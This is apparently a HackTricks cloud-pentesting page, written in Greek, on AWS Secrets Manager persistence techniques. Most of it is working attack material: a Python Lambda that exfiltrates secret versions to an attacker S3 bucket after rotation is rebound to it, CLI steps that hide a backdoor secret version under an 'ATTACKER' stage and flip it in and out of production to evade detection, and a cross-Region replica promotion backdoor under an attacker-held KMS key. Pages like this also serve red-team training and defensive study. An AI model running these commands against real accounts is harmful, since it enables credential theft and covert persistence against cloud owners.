# AWS - Secrets Manager Διατήρηση

{{#include ../../../../banners/hacktricks-training.md}}

## Secrets Manager

Για περισσότερες πληροφορίες δείτε:

{{#ref}}
../../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### Μέσω Resource Policies

Είναι δυνατόν να **παραχωρηθεί πρόσβαση σε secrets σε εξωτερικούς λογαριασμούς** μέσω resource policies. Check the [**Secrets Manager Privesc page**](../../aws-privilege-escalation/aws-secrets-manager-privesc/README.md) για περισσότερες πληροφορίες. Σημειώστε ότι για να **έχει πρόσβαση σε ένα secret**, ο εξωτερικός λογαριασμός θα χρειαστεί επίσης **πρόσβαση στο KMS key που κρυπτογραφεί το secret**.

### Μέσω Secrets Rotate Lambda

Για να **rotate secrets** αυτόματα καλείται μια διαμορφωμένη **Lambda**. Αν ένας επιτιθέμενος μπορούσε να **αλλάξει** τον **κώδικα**, θα μπορούσε άμεσα να **exfiltrate το νέο secret** στον εαυτό του.

Αυτός είναι ο τρόπος που θα μπορούσε να φαίνεται ο κώδικας Lambda για μια τέτοια ενέργεια:
```python
import boto3

def rotate_secrets(event, context):
# Create a Secrets Manager client
client = boto3.client('secretsmanager')

# Retrieve the current secret value
secret_value = client.get_secret_value(SecretId='example_secret_id')['SecretString']

# Rotate the secret by updating its value
new_secret_value = rotate_secret(secret_value)
client.update_secret(SecretId='example_secret_id', SecretString=new_secret_value)

def rotate_secret(secret_value):
# Perform the rotation logic here, e.g., generate a new password

# Example: Generate a new password
new_secret_value = generate_password()

return new_secret_value

def generate_password():
# Example: Generate a random password using the secrets module
import secrets
import string
password = ''.join(secrets.choice(string.ascii_letters + string.digits) for i in range(16))
return password
```
### Αντικατάσταση του rotation Lambda με λειτουργία υπό έλεγχο επιτιθέμενου μέσω RotateSecret

Abuse `secretsmanager:RotateSecret` για να επανασυνδέσετε ένα secret σε ένα rotation Lambda υπό έλεγχο επιτιθέμενου και να ενεργοποιήσετε άμεσα ένα rotation. Η malicious function exfiltrates τις εκδόσεις του secret (AWSCURRENT/AWSPENDING) κατά τα βήματα rotation (createSecret/setSecret/testSecret/finishSecret) σε έναν attacker sink (π.χ. S3 ή external HTTP).

- Απαιτήσεις
- Δικαιώματα: `secretsmanager:RotateSecret`, `lambda:InvokeFunction` στο attacker Lambda, `iam:CreateRole/PassRole/PutRolePolicy` (ή AttachRolePolicy) για να προμηθεύσετε τον ρόλο εκτέλεσης του Lambda με `secretsmanager:GetSecretValue` και προτιμητικά `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage` (ώστε το rotation να συνεχίσει να λειτουργεί), KMS `kms:Decrypt` για το secret KMS key, και `s3:PutObject` (ή outbound egress) για exfiltration.
- Ένα target secret id (`SecretId`) με ενεργοποιημένο rotation ή τη δυνατότητα να ενεργοποιηθεί rotation.

- Επίπτωση
- Ο επιτιθέμενος αποκτά τις τιμές του secret χωρίς να τροποποιήσει τον νόμιμο rotation code. Αλλάζει μόνο η ρύθμιση rotation ώστε να δείχνει στο attacker Lambda. Εάν δεν εντοπιστεί, τα προγραμματισμένα μελλοντικά rotations θα συνεχίσουν να καλούν τη λειτουργία του επιτιθέμενου.

- Βήματα επίθεσης (CLI)
1) Προετοιμάστε attacker sink και ρόλο Lambda
- Δημιουργήστε S3 bucket για exfiltration και έναν ρόλο εκτέλεσης εμπιστευμένο από το Lambda με δικαιώματα να διαβάζει το secret και να γράφει στο S3 (συν logs/KMS όπως απαιτείται).
2) Αναπτύξτε attacker Lambda που σε κάθε βήμα rotation ανακτά τις secret τιμές και τις γράφει στο S3. Η ελάχιστη rotation λογική μπορεί απλώς να αντιγράψει AWSCURRENT σε AWSPENDING και να το προωθήσει στο finishSecret για να διατηρήσει την υπηρεσία υγιή.
3) Επανασύνδεση rotation και ενεργοποίηση
- `aws secretsmanager rotate-secret --secret-id <SECRET_ARN> --rotation-lambda-arn <ATTACKER_LAMBDA_ARN> --rotation-rules '{"ScheduleExpression":"rate(10 days)"}' --rotate-immediately`
4) Επαληθεύστε την exfiltration κάνοντας list το S3 prefix για εκείνο το secret και εξετάζοντας τα JSON artifacts.
5) (Προαιρετικό) Επαναφέρετε το αρχικό rotation Lambda για να μειώσετε την ανίχνευση.

- Παράδειγμα attacker Lambda (Python) exfiltrating σε S3
- Περιβάλλον: `EXFIL_BUCKET=<bucket>`
- Handler: `lambda_function.lambda_handler`
```python
import boto3, json, os, base64, datetime
s3 = boto3.client('s3')
sm = boto3.client('secretsmanager')
BUCKET = os.environ['EXFIL_BUCKET']

def write_s3(key, data):
s3.put_object(Bucket=BUCKET, Key=key, Body=json.dumps(data).encode('utf-8'), ContentType='application/json')

def lambda_handler(event, context):
sid, token, step = event['SecretId'], event['ClientRequestToken'], event['Step']
# Exfil both stages best-effort
def getv(**kw):
try:
r = sm.get_secret_value(**kw)
return {'SecretString': r.get('SecretString')} if 'SecretString' in r else {'SecretBinary': base64.b64encode(r['SecretBinary']).decode('utf-8')}
except Exception as e:
return {'error': str(e)}
current = getv(SecretId=sid, VersionStage='AWSCURRENT')
pending = getv(SecretId=sid, VersionStage='AWSPENDING')
key = f"{sid.replace(':','_')}/{step}/{token}.json"
write_s3(key, {'time': datetime.datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ'), 'step': step, 'secret_id': sid, 'token': token, 'current': current, 'pending': pending})
# Minimal rotation (optional): copy current->pending and promote in finishSecret
# (Implement createSecret/finishSecret using PutSecretValue and UpdateSecretVersionStage)
```
### Κατάληψη Ετικέτας Έκδοσης για Κρυφή Επιμονή (προσαρμοσμένο stage + γρήγορη εναλλαγή AWSCURRENT)

Καταχράσου τις version staging labels του Secrets Manager για να φυτέψεις μια έκδοση secret ελεγχόμενη από τον επιτιθέμενο και να τη διατηρήσεις κρυμμένη κάτω από ένα προσαρμοσμένο στάδιο (για παράδειγμα, `ATTACKER`) ενώ η παραγωγή συνεχίζει να χρησιμοποιεί την αρχική `AWSCURRENT`. Οποιαδήποτε στιγμή, μετακίνησε το `AWSCURRENT` στην έκδοση του επιτιθέμενου για να μολύνεις εξαρτώμενα workloads, και μετά επαναφέρσέ το για να ελαχιστοποιήσεις την ανίχνευση. Αυτό παρέχει διακριτική backdoor επιμονή και γρήγορο χειρισμό ώρας-χρήσης χωρίς να αλλάζει το όνομα του secret ή τη rotation config.

- Απαιτήσεις
- Δικαιώματα: `secretsmanager:PutSecretValue`, `secretsmanager:UpdateSecretVersionStage`, `secretsmanager:DescribeSecret`, `secretsmanager:ListSecretVersionIds`, `secretsmanager:GetSecretValue` (για επαλήθευση)
- ID του στοχευόμενου secret στην Region.

- Επιπτώσεις
- Διατήρηση μιας κρυφής, από τον επιτιθέμενο ελεγχόμενης έκδοσης ενός secret και ατομική (atomically) εναλλαγή του `AWSCURRENT` σε αυτήν κατά ζήτηση, επηρεάζοντας οποιονδήποτε καταναλωτή που επιλύει το ίδιο όνομα secret. Η εναλλαγή και η γρήγορη επαναφορά μειώνουν τις πιθανότητες ανίχνευσης ενώ επιτρέπουν συμβιβασμό κατά τον χρόνο χρήσης.

- Βήματα επίθεσης (CLI)
- Προετοιμασία
- `export SECRET_ID=<target secret id or arn>`

<details>
<summary>Εντολές CLI</summary>
```bash
# 1) Capture current production version id (the one holding AWSCURRENT)
CUR=$(aws secretsmanager list-secret-version-ids \
--secret-id "$SECRET_ID" \
--query "Versions[?contains(VersionStages, AWSCURRENT)].VersionId | [0]" \
--output text)

# 2) Create attacker version with known value (this will temporarily move AWSCURRENT)
BACKTOK=$(uuidgen)
aws secretsmanager put-secret-value \
--secret-id "$SECRET_ID" \
--client-request-token "$BACKTOK" \
--secret-string {backdoor:hunter2!}

# 3) Restore production and hide attacker version under custom stage
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"

aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage ATTACKER \
--move-to-version-id "$BACKTOK"

# Verify stages
aws secretsmanager list-secret-version-ids --secret-id "$SECRET_ID" --include-deprecated

# 4) On-demand flip to the attacker’s value and revert quickly
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$BACKTOK" \
--remove-from-version-id "$CUR"

# Validate served plaintext now equals the attacker payload
aws secretsmanager get-secret-value --secret-id "$SECRET_ID" --query SecretString --output text

# Revert to reduce detection
aws secretsmanager update-secret-version-stage \
--secret-id "$SECRET_ID" \
--version-stage AWSCURRENT \
--move-to-version-id "$CUR" \
--remove-from-version-id "$BACKTOK"
```
</details>

- Σημειώσεις
- Όταν παρέχετε `--client-request-token`, το Secrets Manager το χρησιμοποιεί ως το `VersionId`. Η προσθήκη μιας νέας έκδοσης χωρίς ρητή ρύθμιση των `--version-stages` μετακινεί το `AWSCURRENT` στη νέα έκδοση εξ ορισμού και σηματοδοτεί την προηγούμενη ως `AWSPREVIOUS`.


### Cross-Region Replica Promotion Backdoor (replicate ➜ promote ➜ permissive policy)

Καταχραστείτε τη multi-Region replication του Secrets Manager για να δημιουργήσετε ένα αντίγραφο ενός target secret σε μια λιγότερο παρακολουθούμενη περιοχή, κρυπτογραφήστε το με ένα KMS key που ελέγχεται από τον επιτιθέμενο σε εκείνη την περιοχή, στη συνέχεια προωθήστε το αντίγραφο σε ένα αυτόνομο μυστικό και επισυνάψτε μια επιτρεπτική πολιτική πόρων που παραχωρεί στον επιτιθέμενο δικαίωμα ανάγνωσης. Το αρχικό μυστικό στην κύρια περιοχή παραμένει αμετάβλητο, παρέχοντας ανθεκτική, κρυφή πρόσβαση στην τιμή του μυστικού μέσω του προωθημένου αντιγράφου ενώ παρακάμπτονται οι περιορισμοί KMS/policy στην κύρια.

- Απαιτήσεις
- Δικαιώματα: `secretsmanager:ReplicateSecretToRegions`, `secretsmanager:StopReplicationToReplica`, `secretsmanager:PutResourcePolicy`, `secretsmanager:GetResourcePolicy`, `secretsmanager:DescribeSecret`.
- Στην περιοχή του αντιγράφου: `kms:CreateKey`, `kms:CreateAlias`, `kms:CreateGrant` (ή `kms:PutKeyPolicy`) για να επιτρέψουν στην οντότητα επιτιθέμενου να εκτελέσει `kms:Decrypt`.
- Μια οντότητα επιτιθέμενου (user/role) για να λάβει δικαίωμα ανάγνωσης στο προωθημένο μυστικό.

- Επιπτώσεις
- Επίμονη cross-Region διαδρομή πρόσβασης στην τιμή του μυστικού μέσω ενός αυτόνομου αντιγράφου υπό έναν KMS CMK ελεγχόμενο από τον επιτιθέμενο και επιτρεπτική πολιτική πόρων. Το πρωτεύον μυστικό στην αρχική περιοχή παραμένει αμετάβλητο.

- Επίθεση (CLI)
- Μεταβλητές
```bash
export R1=<primary-region>   # e.g., us-east-1
export R2=<replica-region>   # e.g., us-west-2
export SECRET_ID=<secret name or ARN in R1>
export ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
export ATTACKER_ARN=<arn:aws:iam::<ACCOUNT_ID>:user/<attacker> or role>
```
1) Δημιουργήστε attacker-controlled KMS key στο replica Region
```bash
cat > /tmp/kms_policy.json <<'JSON'
{"Version":"2012-10-17","Statement":[
{"Sid":"EnableRoot","Effect":"Allow","Principal":{"AWS":"arn:aws:iam::${ACCOUNT_ID}:root"},"Action":"kms:*","Resource":"*"}
]}
JSON
KMS_KEY_ID=$(aws kms create-key --region "$R2" --description "Attacker CMK for replica" --policy file:///tmp/kms_policy.json \
--query KeyMetadata.KeyId --output text)
aws kms create-alias --region "$R2" --alias-name alias/attacker-sm --target-key-id "$KMS_KEY_ID"
# Allow attacker to decrypt via a grant (or use PutKeyPolicy to add the principal)
aws kms create-grant --region "$R2" --key-id "$KMS_KEY_ID" --grantee-principal "$ATTACKER_ARN" --operations Decrypt DescribeKey
```
2) Αντιγράψτε το secret στο R2 χρησιμοποιώντας το attacker KMS key
```bash
aws secretsmanager replicate-secret-to-regions --region "$R1" --secret-id "$SECRET_ID" \
--add-replica-regions Region=$R2,KmsKeyId=alias/attacker-sm --force-overwrite-replica-secret
aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" | jq '.ReplicationStatus'
```
3) Προωθήστε το αντίγραφο σε αυτόνομη λειτουργία στο R2
```bash
# Use the secret name (same across Regions)
NAME=$(aws secretsmanager describe-secret --region "$R1" --secret-id "$SECRET_ID" --query Name --output text)
aws secretsmanager stop-replication-to-replica --region "$R2" --secret-id "$NAME"
aws secretsmanager describe-secret --region "$R2" --secret-id "$NAME"
```
4) Επισυνάψτε μια επιτρεπτική πολιτική πόρου στο αυτόνομο μυστικό στο R2
```bash
cat > /tmp/replica_policy.json <<JSON
{"Version":"2012-10-17","Statement":[{"Sid":"AttackerRead","Effect":"Allow","Principal":{"AWS":"${ATTACKER_ARN}"},"Action":["secretsmanager:GetSecretValue"],"Resource":"*"}]}
JSON
aws secretsmanager put-resource-policy --region "$R2" --secret-id "$NAME" --resource-policy file:///tmp/replica_policy.json --block-public-policy
aws secretsmanager get-resource-policy --region "$R2" --secret-id "$NAME"
```
5) Διάβασε το secret από το attacker principal στο R2
```bash
# Configure attacker credentials and read
aws secretsmanager get-secret-value --region "$R2" --secret-id "$NAME" --query SecretString --output text
```
{{#include ../../../../banners/hacktricks-training.md}}
